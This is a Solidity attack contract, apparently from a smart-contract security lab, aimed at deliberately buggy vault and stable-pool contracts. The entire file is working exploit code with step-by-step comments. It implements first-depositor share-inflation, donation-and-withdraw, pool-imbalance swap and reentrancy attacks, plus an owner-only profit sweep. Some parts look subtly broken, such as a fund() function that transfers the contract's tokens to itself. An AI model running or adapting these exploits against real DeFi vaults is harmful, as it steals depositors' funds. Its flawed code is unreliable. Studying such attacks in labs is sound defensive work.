// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attack Vector: Exploit Pool Accounting Bugs
// Targets: VaultBuggy, StablePoolBuggy
// Steps:
// 1. Donate tokens to inflate share price
// 2. Deposit small amount to get inflated shares
// 3. Withdraw to extract value
// OR
// 1. Be first depositor
// 2. Deposit 1 wei
// 3. Donate large amount
// 4. Next depositor gets rekt

import "../interfaces/CommonInterfaces.sol";

interface IVault {
    function deposit(uint256 assets) external returns (uint256 shares);
    function withdraw(uint256 shares) external returns (uint256 assets);
    function donateToVault(uint256 amount) external;
    function getShareValue(uint256 shares) external view returns (uint256);
    function totalShares() external view returns (uint256);
    function totalAssets() external view returns (uint256);
}

interface IStablePool {
    function addLiquidity(uint256 amount0, uint256 amount1) external returns (uint256 liquidity);
    function removeLiquidity(uint256 liquidity) external returns (uint256 amount0, uint256 amount1);
    function swap(address tokenIn, uint256 amountIn, uint256 minAmountOut) external returns (uint256 amountOut);
    function balanceOf(address) external view returns (uint256);
}

contract Attacker_PoolImbalance {
    address public owner;
    
    event AttackInitiated(string attackType);
    event VaultManipulated(uint256 sharesBefore, uint256 sharesAfter, uint256 profit);
    event StablePoolExploited(uint256 profit);

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // ATTACK 1: Vault Share Inflation Attack
    // Target: VaultBuggy first depositor
    function attackVaultInflation(address vault, address asset, uint256 donationAmount) external onlyOwner {
        emit AttackInitiated("Vault Share Inflation");
        
        IVault vaultContract = IVault(vault);
        
        // Step 1: Be the first depositor with 1 wei
        IERC20(asset).approve(vault, type(uint256).max);
        uint256 sharesBefore = vaultContract.deposit(1);
        
        // Step 2: Donate large amount to inflate share price
        IERC20(asset).transfer(vault, donationAmount);
        
        // Now share price is inflated:
        // totalAssets = 1 + donationAmount
        // totalShares = 1
        // share value = (1 + donationAmount) / 1
        
        // Step 3: Next victim deposits will get rekt due to rounding
        // If victim deposits donationAmount/2, they get:
        // shares = (donationAmount/2 * 1) / (1 + donationAmount) ≈ 0 (rounds down!)
        
        uint256 sharesAfter = vaultContract.totalShares();
        emit VaultManipulated(sharesBefore, sharesAfter, donationAmount);
    }

    // ATTACK 2: Vault Donation Front-run Attack
    function attackVaultDonation(address vault, address asset, uint256 depositAmount, uint256 donationAmount) external onlyOwner {
        emit AttackInitiated("Vault Donation Attack");
        
        IVault vaultContract = IVault(vault);
        IERC20 assetToken = IERC20(asset);
        
        uint256 balanceBefore = assetToken.balanceOf(address(this));
        
        // Step 1: Deposit normally
        assetToken.approve(vault, type(uint256).max);
        uint256 shares = vaultContract.deposit(depositAmount);
        
        // Step 2: Donate to inflate share price (or wait for someone else to donate)
        // This inflate the value of our shares
        vaultContract.donateToVault(donationAmount);
        
        // Step 3: Withdraw - we get more than we put in!
        uint256 assets = vaultContract.withdraw(shares);
        
        uint256 balanceAfter = assetToken.balanceOf(address(this));
        uint256 profit = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
        
        emit VaultManipulated(shares, assets, profit);
    }

    // ATTACK 3: StablePool Imbalance Attack
    // Exploit buggy stable pool swap calculation
    function attackStablePool(
        address pool,
        address token0,
        address token1,
        uint256 amount0,
        uint256 amount1,
        uint256 swapAmount
    ) external onlyOwner {
        emit AttackInitiated("StablePool Imbalance");
        
        IStablePool poolContract = IStablePool(pool);
        IERC20(token0).approve(pool, type(uint256).max);
        IERC20(token1).approve(pool, type(uint256).max);
        
        uint256 balanceBefore = IERC20(token1).balanceOf(address(this));
        
        // Step 1: Add liquidity with imbalanced ratio
        // Bug in StablePoolBuggy doesn't enforce proper ratio
        uint256 liquidity = poolContract.addLiquidity(amount0, amount1);
        
        // Step 2: Swap to exploit buggy calculation
        // The buggy getY function doesn't follow proper Curve formula
        uint256 amountOut = poolContract.swap(token0, swapAmount, 0);
        
        // Step 3: Remove liquidity
        (uint256 out0, uint256 out1) = poolContract.removeLiquidity(liquidity);
        
        uint256 balanceAfter = IERC20(token1).balanceOf(address(this));
        uint256 profit = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
        
        emit StablePoolExploited(profit);
    }

    // ATTACK 4: Reentrancy on buggy vault
    // If vault updates balances in wrong order, we can reenter
    bool private attacking;
    address private targetVault;
    uint256 private attackShares;
    
    function attackVaultReentrancy(address vault, address asset, uint256 depositAmount) external onlyOwner {
        emit AttackInitiated("Vault Reentrancy");
        
        targetVault = vault;
        attacking = true;
        
        // Deposit
        IERC20(asset).approve(vault, type(uint256).max);
        attackShares = IVault(vault).deposit(depositAmount);
        
        // Withdraw - if vault has reentrancy bug, we reenter
        IVault(vault).withdraw(attackShares);
        
        attacking = false;
    }

    // Fallback for reentrancy
    fallback() external {
        if (attacking && targetVault != address(0)) {
            // Try to reenter
            try IVault(targetVault).withdraw(attackShares / 2) {
                // Successfully reentered
            } catch {
                // Reentrancy protection worked
            }
        }
    }

    // Withdraw profits
    function withdraw(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        if (balance > 0) {
            IERC20(token).transfer(owner, balance);
        }
    }

    // Fund attacker with tokens
    function fund(address token, uint256 amount) external {
        IERC20(token).transfer(address(this), amount);
    }

    receive() external payable {}
}

